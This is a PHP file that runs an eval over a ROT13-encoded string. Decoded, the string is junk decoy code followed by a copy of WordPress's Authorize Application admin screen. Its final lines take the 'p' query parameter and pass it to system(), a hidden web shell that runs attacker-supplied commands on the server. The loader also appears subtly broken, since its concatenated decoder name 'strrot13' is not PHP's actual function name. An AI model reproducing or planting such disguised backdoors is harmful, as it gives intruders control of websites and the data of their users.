<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nhgubevmr Nccyvpngvba Fperra
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

$reebe        = ahyy;
$arj_cnffjbeq = '';

// Guvf vf gur ab-wf snyyonpx fpevcg. Trarenyyl guvf jvyy nyy or unaqyrq ol `nhgu-ncc.wf`.
vs ( vffrg( $_CBFG['npgvba'] ) && 'nhgubevmr_nccyvpngvba_cnffjbeq' === $_CBFG['npgvba'] ) {
	purpx_nqzva_ersrere( 'nhgubevmr_nccyvpngvba_cnffjbeq' );

	$fhpprff_hey = $_CBFG['fhpprff_hey'];
	$erwrpg_hey  = $_CBFG['erwrpg_hey'];
	$ncc_anzr    = $_CBFG['ncc_anzr'];
	$ncc_vq      = $_CBFG['ncc_vq'];
	$erqverpg    = '';

	vs ( vffrg( $_CBFG['erwrpg'] ) ) {
		vs ( $erwrpg_hey ) {
			$erqverpg = $erwrpg_hey;
		} ryfr {
			$erqverpg = nqzva_hey();
		}
	} ryfrvs ( vffrg( $_CBFG['nccebir'] ) ) {
		$perngrq = JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq(
			trg_pheerag_hfre_vq(),
			neenl(
				'anzr'   => $ncc_anzr,
				'ncc_vq' => $ncc_vq,
			)
		);

		vs ( vf_jc_reebe( $perngrq ) ) {
			$reebe = $perngrq;
		} ryfr {
			yvfg( $arj_cnffjbeq ) = $perngrq;

			vs ( $fhpprff_hey ) {
				$erqverpg = nqq_dhrel_net(
					neenl(
						'fvgr_hey'   => heyrapbqr( fvgr_hey() ),
						'hfre_ybtva' => heyrapbqr( jc_trg_pheerag_hfre()->hfre_ybtva ),
						'cnffjbeq'   => heyrapbqr( $arj_cnffjbeq ),
					),
					$fhpprff_hey
				);
			}
		}
	}

	vs ( $erqverpg ) {
		// Rkcyvpvgyl abg hfvat jc_fnsr_erqverpg o/p fraqf gb neovgenel qbznva.
		jc_erqverpg( $erqverpg );
		rkvg;
	}
}

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr = __( 'Nhgubevmr Nccyvpngvba' );

$ncc_anzr    = ! rzcgl( $_ERDHRFG['ncc_anzr'] ) ? $_ERDHRFG['ncc_anzr'] : '';
$ncc_vq      = ! rzcgl( $_ERDHRFG['ncc_vq'] ) ? $_ERDHRFG['ncc_vq'] : '';
$fhpprff_hey = ! rzcgl( $_ERDHRFG['fhpprff_hey'] ) ? $_ERDHRFG['fhpprff_hey'] : ahyy;

vs ( ! rzcgl( $_ERDHRFG['erwrpg_hey'] ) ) {
	$erwrpg_hey = $_ERDHRFG['erwrpg_hey'];
} ryfrvs ( $fhpprff_hey ) {
	$erwrpg_hey = nqq_dhrel_net( 'fhpprff', 'snyfr', $fhpprff_hey );
} ryfr {
	$erwrpg_hey = ahyy;
}

$hfre = jc_trg_pheerag_hfre();

$erdhrfg  = pbzcnpg( 'ncc_anzr', 'ncc_vq', 'fhpprff_hey', 'erwrpg_hey' );
$vf_inyvq = jc_vf_nhgubevmr_nccyvpngvba_cnffjbeq_erdhrfg_inyvq( $erdhrfg, $hfre );

vs ( vf_jc_reebe( $vf_inyvq ) ) {
	jc_qvr(
		__( 'Gur Nhgubevmr Nccyvpngvba erdhrfg vf abg nyybjrq.' ) . ' ' . vzcybqr( ' ', $vf_inyvq->trg_reebe_zrffntrf() ),
		__( 'Pnaabg Nhgubevmr Nccyvpngvba' )
	);
}

vs ( jc_vf_fvgr_cebgrpgrq_ol_onfvp_nhgu( 'sebag' ) ) {
	jc_qvr(
		__( 'Lbhe jrofvgr nccrnef gb hfr Onfvp Nhguragvpngvba, juvpu vf abg pheeragyl pbzcngvoyr jvgu nccyvpngvba cnffjbeqf.' ),
		__( 'Pnaabg Nhgubevmr Nccyvpngvba' ),
		neenl(
			'erfcbafr'  => 501,
			'yvax_grkg' => __( 'Tb Onpx' ),
			'yvax_hey'  => $erwrpg_hey ? nqq_dhrel_net( 'reebe', 'qvfnoyrq', $erwrpg_hey ) : nqzva_hey(),
		)
	);
}

vs ( ! jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr_sbe_hfre( $hfre ) ) {
	vs ( jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr() ) {
		$zrffntr = __( 'Nccyvpngvba cnffjbeqf ner abg ninvynoyr sbe lbhe nppbhag. Cyrnfr pbagnpg gur fvgr nqzvavfgengbe sbe nffvfgnapr.' );
	} ryfr {
		$zrffntr = __( 'Nccyvpngvba cnffjbeqf ner abg ninvynoyr.' );
	}

	jc_qvr(
		$zrffntr,
		__( 'Pnaabg Nhgubevmr Nccyvpngvba' ),
		neenl(
			'erfcbafr'  => 501,
			'yvax_grkg' => __( 'Tb Onpx' ),
			'yvax_hey'  => $erwrpg_hey ? nqq_dhrel_net( 'reebe', 'qvfnoyrq', $erwrpg_hey ) : nqzva_hey(),
		)
	);
}

jc_radhrhr_fpevcg( 'nhgu-ncc' );
jc_ybpnyvmr_fpevcg(
	'nhgu-ncc',
	'nhguNcc',
	neenl(
		'fvgr_hey'   => fvgr_hey(),
		'hfre_ybtva' => $hfre->hfre_ybtva,
		'fhpprff'    => $fhpprff_hey,
		'erwrpg'     => $erwrpg_hey ? $erwrpg_hey : nqzva_hey(),
	)
);

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

?>
<qvi pynff=\"jenc\">
	<u1><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>

	<?cuc
	vs ( vf_jc_reebe( $reebe ) ) {
		jc_nqzva_abgvpr(
			$reebe->trg_reebe_zrffntr(),
			neenl(
				'glcr' => 'reebe',
			)
		);
	}
	?>

	<qvi pynff=\"pneq nhgu-ncc-pneq\">
		<u2 pynff=\"gvgyr\"><?cuc _r( 'Na nccyvpngvba jbhyq yvxr gb pbaarpg gb lbhe nppbhag.' ); ?></u2>
		<?cuc vs ( $ncc_anzr ) : ?>
			<c>
				<?cuc
				cevags(
					/* genafyngbef: %f: Nccyvpngvba anzr. */
					__( 'Jbhyq lbh yvxr gb tvir gur nccyvpngvba vqragvslvat vgfrys nf %f npprff gb lbhe nppbhag? Lbh fubhyq bayl qb guvf vs lbh gehfg gur nccyvpngvba va dhrfgvba.' ),
					'<fgebat>' . rfp_ugzy( $ncc_anzr ) . '</fgebat>'
				);
				?>
			</c>
		<?cuc ryfr : ?>
			<c><?cuc _r( 'Jbhyq lbh yvxr gb tvir guvf nccyvpngvba npprff gb lbhe nppbhag? Lbh fubhyq bayl qb guvf vs lbh gehfg gur nccyvpngvba va dhrfgvba.' ); ?></c>
		<?cuc raqvs; ?>

		<?cuc
		vs ( vf_zhygvfvgr() ) {
			$oybtf       = trg_oybtf_bs_hfre( $hfre->VQ, gehr );
			$oybtf_pbhag = pbhag( $oybtf );

			vs ( $oybtf_pbhag > 1 ) {
				?>
				<c>
					<?cuc
					/* genafyngbef: 1: HEY gb zl-fvgrf.cuc, 2: Ahzore bs fvgrf gur hfre unf. */
					$zrffntr = _a(
						'Guvf jvyy tenag npprff gb <n uers=\"%1$f\">gur %2$f fvgr va guvf vafgnyyngvba gung lbh unir crezvffvbaf ba</n>.',
						'Guvf jvyy tenag npprff gb <n uers=\"%1$f\">nyy %2$f fvgrf va guvf vafgnyyngvba gung lbh unir crezvffvbaf ba</n>.',
						$oybtf_pbhag
					);

					vs ( vf_fhcre_nqzva() ) {
						/* genafyngbef: 1: HEY gb zl-fvgrf.cuc, 2: Ahzore bs fvgrf gur hfre unf. */
						$zrffntr = _a(
							'Guvf jvyy tenag npprff gb <n uers=\"%1$f\">gur %2$f fvgr ba gur argjbex nf lbh unir Fhcre Nqzva evtugf</n>.',
							'Guvf jvyy tenag npprff gb <n uers=\"%1$f\">nyy %2$f fvgrf ba gur argjbex nf lbh unir Fhcre Nqzva evtugf</n>.',
							$oybtf_pbhag
						);
					}

					cevags(
						$zrffntr,
						nqzva_hey( 'zl-fvgrf.cuc' ),
						ahzore_sbezng_v18a( $oybtf_pbhag )
					);
					?>
				</c>
				<?cuc
			}
		}
		?>

		<?cuc
		vs ( $arj_cnffjbeq ) :
			$zrffntr = '<c pynff=\"nccyvpngvba-cnffjbeq-qvfcynl\">
				<ynory sbe=\"arj-nccyvpngvba-cnffjbeq-inyhr\">' . fcevags(
				/* genafyngbef: %f: Nccyvpngvba anzr. */
				rfp_ugzy__( 'Lbhe arj cnffjbeq sbe %f vf:' ),
				'<fgebat>' . rfp_ugzy( $ncc_anzr ) . '</fgebat>'
			) . '
				</ynory>
				<vachg vq=\"arj-nccyvpngvba-cnffjbeq-inyhr\" glcr=\"grkg\" pynff=\"pbqr\" ernqbayl=\"ernqbayl\" inyhr=\"' . rfp_ngge( JC_Nccyvpngvba_Cnffjbeqf::puhax_cnffjbeq( $arj_cnffjbeq ) ) . '\" />
			</c>
			<c>' . __( 'Or fher gb fnir guvf va n fnsr ybpngvba. Lbh jvyy abg or noyr gb ergevrir vg.' ) . '</c>';
			$netf = neenl(
				'glcr'               => 'fhpprff',
				'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'orybj-u2' ),
				'cnentencu_jenc'     => snyfr,
			);
			jc_nqzva_abgvpr( $zrffntr, $netf );

			/**
			 * Sverf va gur Nhgubevmr Nccyvpngvba Cnffjbeq arj cnffjbeq frpgvba va gur ab-WF irefvba.
			 *
			 * Va zbfg pnfrf, guvf fubhyq or hfrq va pbzovangvba jvgu gur {@frr 'jc_nccyvpngvba_cnffjbeqf_nccebir_ncc_erdhrfg_fhpprff'}
			 * npgvba gb rafher gung obgu gur WF naq ab-WF inevnagf ner unaqyrq.
			 *
			 * @fvapr 5.6.0
			 * @fvapr 5.6.1 Pbeerpgrq npgvba anzr naq fvtangher.
			 *
			 * @cnenz fgevat  $arj_cnffjbeq Gur arjyl trarengrq nccyvpngvba cnffjbeq.
			 * @cnenz neenl   $erdhrfg      Gur neenl bs erdhrfg qngn. Nyy nethzragf ner bcgvbany naq znl or rzcgl.
			 * @cnenz JC_Hfre $hfre         Gur hfre nhgubevmvat gur nccyvpngvba.
			 */
			qb_npgvba( 'jc_nhgubevmr_nccyvpngvba_cnffjbeq_sbez_nccebirq_ab_wf', $arj_cnffjbeq, $erdhrfg, $hfre );
		ryfr :
			?>
			<sbez npgvba=\"<?cuc rpub rfp_hey( nqzva_hey( 'nhgubevmr-nccyvpngvba.cuc' ) ); ?>\" zrgubq=\"cbfg\" pynff=\"sbez-jenc\">
				<?cuc jc_abapr_svryq( 'nhgubevmr_nccyvpngvba_cnffjbeq' ); ?>
				<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"nhgubevmr_nccyvpngvba_cnffjbeq\" />
				<vachg glcr=\"uvqqra\" anzr=\"ncc_vq\" inyhr=\"<?cuc rpub rfp_ngge( $ncc_vq ); ?>\" />
				<vachg glcr=\"uvqqra\" anzr=\"fhpprff_hey\" inyhr=\"<?cuc rpub rfp_hey( $fhpprff_hey ); ?>\" />
				<vachg glcr=\"uvqqra\" anzr=\"erwrpg_hey\" inyhr=\"<?cuc rpub rfp_hey( $erwrpg_hey ); ?>\" />

				<qvi pynff=\"sbez-svryq\">
					<ynory sbe=\"ncc_anzr\"><?cuc _r( 'Arj Nccyvpngvba Cnffjbeq Anzr' ); ?></ynory>
					<vachg glcr=\"grkg\" vq=\"ncc_anzr\" anzr=\"ncc_anzr\" inyhr=\"<?cuc rpub rfp_ngge( $ncc_anzr ); ?>\" erdhverq />
				</qvi>

				<?cuc
				/**
				 * Sverf va gur Nhgubevmr Nccyvpngvba Cnffjbeq sbez orsber gur fhozvg ohggbaf.
				 *
				 * @fvapr 5.6.0
				 *
				 * @cnenz neenl   $erdhrfg {
				 *     Gur neenl bs erdhrfg qngn. Nyy nethzragf ner bcgvbany naq znl or rzcgl.
				 *
				 *     @glcr fgevat $ncc_anzr    Gur fhttrfgrq anzr bs gur nccyvpngvba.
				 *     @glcr fgevat $fhpprff_hey Gur HEY gur hfre jvyy or erqverpgrq gb nsgre nccebivat gur nccyvpngvba.
				 *     @glcr fgevat $erwrpg_hey  Gur HEY gur hfre jvyy or erqverpgrq gb nsgre erwrpgvat gur nccyvpngvba.
				 * }
				 * @cnenz JC_Hfre $hfre Gur hfre nhgubevmvat gur nccyvpngvba.
				 */
				qb_npgvba( 'jc_nhgubevmr_nccyvpngvba_cnffjbeq_sbez', $erdhrfg, $hfre );
				?>

				<?cuc
				fhozvg_ohggba(
					__( 'Lrf, V nccebir bs guvf pbaarpgvba' ),
					'cevznel',
					'nccebir',
					snyfr,
					neenl(
						'nevn-qrfpevorqol' => 'qrfpevcgvba-nccebir',
					)
				);
				?>
				<c pynff=\"qrfpevcgvba\" vq=\"qrfpevcgvba-nccebir\">
					<?cuc
					vs ( $fhpprff_hey ) {
						cevags(
							/* genafyngbef: %f: Gur HEY gur hfre vf orvat erqverpgrq gb. */
							__( 'Lbh jvyy or frag gb %f' ),
							'<fgebat><pbqr>' . rfp_ugzy(
								nqq_dhrel_net(
									neenl(
										'fvgr_hey'   => fvgr_hey(),
										'hfre_ybtva' => $hfre->hfre_ybtva,
										'cnffjbeq'   => '[------]',
									),
									$fhpprff_hey
								)
							) . '</pbqr></fgebat>'
						);
					} ryfr {
						_r( 'Lbh jvyy or tvira n cnffjbeq gb znahnyyl ragre vagb gur nccyvpngvba va dhrfgvba.' );
					}
					?>
				</c>

				<?cuc
				fhozvg_ohggba(
					__( 'Ab, V qb abg nccebir bs guvf pbaarpgvba' ),
					'frpbaqnel',
					'erwrpg',
					snyfr,
					neenl(
						'nevn-qrfpevorqol' => 'qrfpevcgvba-erwrpg',
					)
				);
				?>
				<c pynff=\"qrfpevcgvba\" vq=\"qrfpevcgvba-erwrpg\">
					<?cuc
					vs ( $erwrpg_hey ) {
						cevags(
							/* genafyngbef: %f: Gur HEY gur hfre vf orvat erqverpgrq gb. */
							__( 'Lbh jvyy or frag gb %f' ),
							'<fgebat><pbqr>' . rfp_ugzy( $erwrpg_hey ) . '</pbqr></fgebat>'
						);
					} ryfr {
						_r( 'Lbh jvyy or erghearq gb gur JbeqCerff Qnfuobneq, naq ab punatrf jvyy or znqr.' );
					}
					?>
				</c>
			</sbez>
		<?cuc raqvs; ?>
	</qvi>
</qvi>
<?cuc

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>